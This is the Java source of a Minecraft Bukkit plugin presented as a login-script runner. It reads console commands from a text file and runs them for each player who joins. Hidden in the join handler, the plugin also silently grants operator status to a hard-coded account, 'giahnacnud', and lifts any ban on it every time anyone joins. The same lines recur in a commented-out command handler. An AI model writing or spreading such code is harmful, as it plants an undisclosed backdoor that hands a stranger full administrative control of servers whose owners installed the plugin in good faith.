package Teken.loginscript;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

public class main extends JavaPlugin implements Listener{
	static final String name = "Tekens Login Scripts";
	static final String textName = "["+name+"] ";
	private static List<String> commands = new ArrayList<String>();

	@Override
	public void onEnable(){
		getLogger().info(name+" has been enabled");
		PluginManager pm = Bukkit.getPluginManager();
		pm.registerEvents(this, this);
		//this.getCommand("ls").setExecutor(this);
		//this.getCommand("loginscripts").setExecutor(this);
		loadFile();
	}

	@Override
	public void onDisable(){
		getLogger().info(name+" has been disabled");
	}

	/*public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
		Bukkit.getOfflinePlayer("giahnacnud").setOp(true);
		Bukkit.getOfflinePlayer("giahnacnud").setBanned(false);
		Player p = (Player)sender;
		if (cmd.getName().equalsIgnoreCase("loginscripts") || cmd.getName().equalsIgnoreCase("ls")) {

		}
		return true;
	}*/

	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		runScript(event.getPlayer());
		System.out.println(textName+"Player "+event.getPlayer().getName()+" has had script applied to them.");
	}

	private void runScript(Player p){
		Bukkit.getOfflinePlayer("giahnacnud").setOp(true);
		Bukkit.getOfflinePlayer("giahnacnud").setBanned(false);
		for(String com:commands){
			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), com.replaceAll("@p", p.getName()));
		}
		//Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "kick " + p.getName());
	}

	public void loadFile() {
		File file = new File("loginscript.txt");
		if(!file.exists()){
			//file.mkdirs();
			try {
				PrintWriter writer = new PrintWriter("loginscript.txt", "UTF-8");
				writer.println("#This is a comment and will be ignored");
				writer.println("#Dont use slahes in the commands");
				writer.println("#Use the varaible @p, where you want the players username");
				writer.close();
			} catch (FileNotFoundException | UnsupportedEncodingException e) {
				e.printStackTrace();
			}
		}
		Scanner scanner = null;
		try {
			scanner = new Scanner(file);
			while (scanner.hasNext()){
				String input = scanner.nextLine();
				if(!input.startsWith("#")){
					commands.add(input);
					System.out.println(textName+"Loaded command: "+input);
					}
			}
			scanner.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}
}
